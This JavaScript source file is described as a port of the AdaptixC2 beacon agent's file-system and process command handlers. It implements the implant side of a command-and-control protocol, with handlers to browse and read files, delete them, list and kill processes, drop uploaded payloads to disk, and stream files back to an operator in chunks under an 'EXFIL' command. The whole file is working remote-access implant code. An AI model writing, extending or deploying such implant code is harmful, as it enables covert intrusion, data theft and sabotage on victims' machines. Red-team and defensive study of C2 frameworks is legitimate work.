// Ported from AdaptixC2 (https://github.com/Adaptix-Framework/AdaptixC2),
// AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Commander.cpp (file-system + process command handlers and reply layouts) — GPLv3, (c) the
// AdaptixC2 authors. Structural fidelity is deliberate; deviations are noted inline.
// fsops.js — file-system + process command handlers (Adaptix beacon parity).
//
// Wire layouts mirror src_beacon/beacon/Commander.cpp exactly (verified against
// pl_main.go ProcessData parsers):
//
//   CD(8)     in: [str path][taskId]              out: [taskId][8][str cwd]
//   LS(14)    in: [str path][taskId]              out: [taskId][14][u8 ok][str fullpath][u32 n]{[u8 dir][u64 size][u32 mtime][str name]}*
//                                                 or  [taskId][14][u8 0][u32 err]
//   CAT(24)   in: [str path][taskId]              out: [taskId][24][str path][bytes content<=2048]
//   MKDIR(27) in: [str path][taskId]              out: [taskId][27][str path]
//   RM(17)    in: [str path][taskId]              out: [taskId][17][u8 wasDir]
//   PS_LIST(41) in: [taskId]                      out: [taskId][41][u8 ok][u32 n]{[u16 pid][u16 ppid][u16 sess][u8 arch][u8 elev][str domain][str user][str name]}*
//   PS_KILL(42) in: [u32 pid][taskId]             out: [taskId][42][u32 pid]
//   UPLOAD(33)  in: [u32 memoryId][str path][taskId]  out: [taskId][33]  (server pre-sends SAVEMEMORY chunks)
//   SAVEMEMORY(0x2321) in: [u32 id][u32 total][bytes chunk][taskId]  out: NONE (MemorySaver.cpp)
//   DOWNLOAD(32) in: [str path][taskId]           out: start [taskId][32][u32 fid][u8 1][u64 size][str fullpath]
//                                                 chunk [taskId][32][u32 fid][u8 2][bytes data]  (Downlaoder.cpp pump, every tick)
//                                                 done  [taskId][32][u32 fid][u8 3]
//   EXFIL(35)  in: [u32 state][u32 fid][taskId]   out: [taskId][35][u32 fid][u8 state]  (stop=2 resume=1 cancel=4)
//   any error: [taskId][0x1111ffff][u32 win32err]
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

const CP = {
  CD: 8, LS: 14, RM: 17, MKDIR: 27, CAT: 24,
  PS_LIST: 41, PS_KILL: 42,
  UPLOAD: 33, DOWNLOAD: 32, EXFIL: 35,
  SAVEMEMORY: 0x2321, ERROR: 0x1111ffff,
};

// errno -> win32 error codes (server renders "Error [n]: <TsWin32Error>")
const ERRNO = { EACCES: 5, EPERM: 5, ENOENT: 2, ENOTDIR: 3, EEXIST: 80, ENOTEMPTY: 145, EISDIR: 2, EINVAL: 87 };
const errCode = (e) => ERRNO[e && e.code] || 1;

function createState() {
  return { cwd: process.cwd(), downloads: [], memory: new Map() };
}

function errReply(OutPacker, taskId, code) {
  const o = new OutPacker();
  o.u32(taskId).u32(CP.ERROR).u32(code);
  return o;
}
const resolveIn = (state, p) => path.resolve(state.cwd, p);

// ---- individual handlers (r = TaskReader positioned after commandId) ------

function hCd(state, OutPacker, r) {
  const p = r.str(); const taskId = r.u32();
  const full = resolveIn(state, p);
  try {
    if (!fs.statSync(full).isDirectory()) { const e = new Error('not a directory'); e.code = 'ENOTDIR'; throw e; }
    state.cwd = full;
    const o = new OutPacker(); o.u32(taskId).u32(CP.CD).str(state.cwd);
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
}

function hLs(state, OutPacker, r) {
  const p = r.str(); const taskId = r.u32();
  const full = resolveIn(state, p);
  try {
    const st = fs.statSync(full);
    const items = [];
    if (st.isDirectory()) {
      for (const d of fs.readdirSync(full, { withFileTypes: true })) {
        let ist = null;
        try { ist = fs.lstatSync(path.join(full, d.name)); } catch (_) { continue; }
        items.push({ dir: d.isDirectory(), size: ist.size, mtime: Math.floor(ist.mtimeMs / 1000), name: d.name });
      }
    } else {
      items.push({ dir: false, size: st.size, mtime: Math.floor(st.mtimeMs / 1000), name: path.basename(full) });
    }
    const o = new OutPacker();
    o.u32(taskId).u32(CP.LS).u8(1).str(full).u32(items.length);
    for (const it of items) o.u8(it.dir ? 1 : 0).u64(it.size).u32(it.mtime).str(it.name);
    return o;
  } catch (e) {
    const o = new OutPacker();
    o.u32(taskId).u32(CP.LS).u8(0).u32(errCode(e));
    return o;
  }
}

function hCat(state, OutPacker, r) {
  const p = r.str(); const taskId = r.u32();
  const full = resolveIn(state, p);
  let fd = null;
  try {
    fd = fs.openSync(full, 'r');
    const buf = Buffer.alloc(2048); // C++ CmdCat contentSize = 2048
    const n = fs.readSync(fd, buf, 0, 2048, 0);
    const o = new OutPacker();
    o.u32(taskId).u32(CP.CAT).str(p).bytes(buf.slice(0, n));
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
  finally { if (fd !== null) { try { fs.closeSync(fd); } catch (_) {} } }
}

function hMkdir(state, OutPacker, r) {
  const p = r.str(); const taskId = r.u32();
  try {
    fs.mkdirSync(resolveIn(state, p)); // single level, like CreateDirectoryA
    const o = new OutPacker(); o.u32(taskId).u32(CP.MKDIR).str(p);
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
}

function hRm(state, OutPacker, r) {
  const p = r.str(); const taskId = r.u32();
  const full = resolveIn(state, p);
  try {
    const st = fs.lstatSync(full);
    if (st.isDirectory()) fs.rmdirSync(full); else fs.unlinkSync(full); // RemoveDirectoryA / DeleteFileA
    const o = new OutPacker(); o.u32(taskId).u32(CP.RM).u8(st.isDirectory() ? 1 : 0);
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
}

// process listing via `ps` — output is packed into the C++ PSYSTEM_PROCESS
// reply shape (pid/ppid/session u16, arch byte 1=x64, elevated byte, domain/
// user/name strings). Cross-platform enough for macOS + Linux.
function listProcesses() {
  const out = execSync('ps -axww -o pid=,ppid=,sess=,user=,comm= 2>/dev/null', { maxBuffer: 16 * 1024 * 1024 }).toString();
  const list = [];
  for (const line of out.split('\n')) {
    const m = line.match(/^\s*(\d+)\s+(\d+)\s+(\d+)\s+(\S+)\s+(.*)$/);
    if (!m) continue;
    list.push({
      pid: parseInt(m[1], 10) & 0xffff,
      ppid: parseInt(m[2], 10) & 0xffff,
      sess: parseInt(m[3], 10) & 0xffff,
      user: m[4],
      name: path.basename(m[5].trim()) || m[5].trim(),
    });
  }
  return list;
}

function hPsList(state, OutPacker, r) {
  const taskId = r.u32();
  try {
    const procs = listProcesses();
    const o = new OutPacker();
    o.u32(taskId).u32(CP.PS_LIST).u8(1).u32(procs.length);
    for (const p of procs) {
      o.u16(p.pid).u16(p.ppid).u16(p.sess)
        .u8(1) // arch: 1 = x64 (0 = x32, per pl_main.go ParseInt8 mapping)
        .u8(p.user === 'root' ? 1 : 0)
        .str('').str(p.user).str(p.name);
    }
    return o;
  } catch (e) {
    const o = new OutPacker();
    o.u32(taskId).u32(CP.PS_LIST).u8(0).u32(errCode(e));
    return o;
  }
}

function hPsKill(state, OutPacker, r) {
  const pid = r.u32(); const taskId = r.u32();
  try {
    process.kill(pid, 'SIGKILL'); // NtTerminateProcess analogue
    const o = new OutPacker(); o.u32(taskId).u32(CP.PS_KILL).u32(pid);
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
}

// ---- upload: server streams file via SAVEMEMORY tasks, then UPLOAD --------

function hSaveMemory(state, r) {
  const memoryId = r.u32(); const total = r.u32(); const chunk = r.raw(); const taskId = r.u32();
  let m = state.memory.get(memoryId);
  if (!m) { m = { total, buf: Buffer.alloc(0) }; state.memory.set(memoryId, m); }
  m.buf = Buffer.concat([m.buf, chunk]);
  m.complete = m.buf.length >= m.total;
  return null; // C++ CmdSaveMemory packs NO reply (MemorySaver.cpp)
}

function hUpload(state, OutPacker, r) {
  const memoryId = r.u32(); const p = r.str(); const taskId = r.u32();
  const m = state.memory.get(memoryId);
  state.memory.delete(memoryId); // RemoveMemoryData happens regardless of outcome
  if (!m || !m.complete) return errReply(OutPacker, taskId, 2);
  try {
    fs.writeFileSync(resolveIn(state, p), m.buf, { flag: 'wx' }); // CREATE_NEW semantics
    const o = new OutPacker(); o.u32(taskId).u32(CP.UPLOAD);
    return o;
  } catch (e) { return errReply(OutPacker, taskId, errCode(e)); }
}

// ---- download: register job; chunk pump runs every tick (Downloader.cpp) ---

function hDownload(state, OutPacker, cfg, r) {
  const p = r.str(); const taskId = r.u32();
  const full = resolveIn(state, p);
  let fd = null;
  try {
    const st = fs.statSync(full);
    if (!st.isFile()) { const e = new Error('not a file'); e.code = 'EISDIR'; throw e; }
    fd = fs.openSync(full, 'r');
    const fileId = crypto.randomBytes(4).readUInt32BE(0) >>> 0;
    state.downloads.push({ fileId, taskId, fd, size: st.size, pos: 0, state: 1 /* RUNNING */ });
    const o = new OutPacker();
    o.u32(taskId).u32(CP.DOWNLOAD).u32(fileId).u8(1).u64(st.size).str(full);
    return o;
  } catch (e) { if (fd !== null) { try { fs.closeSync(fd); } catch (_) {} } return errReply(OutPacker, taskId, errCode(e)); }
}

function hExfil(state, OutPacker, r) {
  const newState = r.u32(); const fileId = r.u32(); const taskId = r.u32();
  const job = state.downloads.find((d) => d.fileId === fileId);
  if (!job) return errReply(OutPacker, taskId, 2);
  job.state = newState;
  const o = new OutPacker(); o.u32(taskId).u32(CP.EXFIL).u32(fileId).u8(newState & 0xff);
  if (newState === 4 || newState === 3) { // canceled / finished -> close + drop
    try { fs.closeSync(job.fd); } catch (_) {}
    state.downloads = state.downloads.filter((d) => d.fileId !== fileId);
  }
  return o;
}

// Mirrors Downloader::ProcessDownloader — called EVERY tick (MainAgent.cpp:77):
// appends chunk/finish frames for all RUNNING downloads to the same output
// packer as command replies. Works even in ticks with no tasks.
function processDownloads(state, out, cfg) {
  if (!state.downloads.length) return;
  const chunkSize = (cfg && cfg.file_chunk_size) || 0x80000;
  for (let i = state.downloads.length - 1; i >= 0; i--) {
    const d = state.downloads[i];
    if (d.state === 1) { // RUNNING
      let n = 0;
      try {
        const buf = Buffer.alloc(Math.min(chunkSize, d.size - d.pos));
        n = fs.readSync(d.fd, buf, 0, buf.length, d.pos);
        if (n > 0) {
          d.pos += n;
          out.u32(d.taskId).u32(CP.DOWNLOAD).u32(d.fileId).u8(2).bytes(buf.slice(0, n));
          if (d.pos >= d.size) d.state = 3; // FINISHED
        } else d.state = 4; // CANCELED (read 0)
      } catch (_) { d.state = 4; }
    }
    if (d.state === 3) { out.u32(d.taskId).u32(CP.DOWNLOAD).u32(d.fileId).u8(3); }
    if (d.state === 4) { out.u32(d.taskId).u32(CP.EXFIL).u32(d.fileId).u8(4); }
    if (d.state === 3 || d.state === 4) {
      try { fs.closeSync(d.fd); } catch (_) {}
      state.downloads.splice(i, 1);
    }
  }
}

// ---- dispatch --------------------------------------------------------------

function dispatch(commandId, r, cfg, state, OutPacker) {
  switch (commandId) {
    case CP.CD: return hCd(state, OutPacker, r);
    case CP.LS: return hLs(state, OutPacker, r);
    case CP.CAT: return hCat(state, OutPacker, r);
    case CP.MKDIR: return hMkdir(state, OutPacker, r);
    case CP.RM: return hRm(state, OutPacker, r);
    case CP.PS_LIST: return hPsList(state, OutPacker, r);
    case CP.PS_KILL: return hPsKill(state, OutPacker, r);
    case CP.UPLOAD: return hUpload(state, OutPacker, r);
    case CP.SAVEMEMORY: return hSaveMemory(state, r);
    case CP.DOWNLOAD: return hDownload(state, OutPacker, cfg, r);
    case CP.EXFIL: return hExfil(state, OutPacker, r);
    default: return undefined;
  }
}

module.exports = { createState, dispatch, processDownloads, errCode, CP };
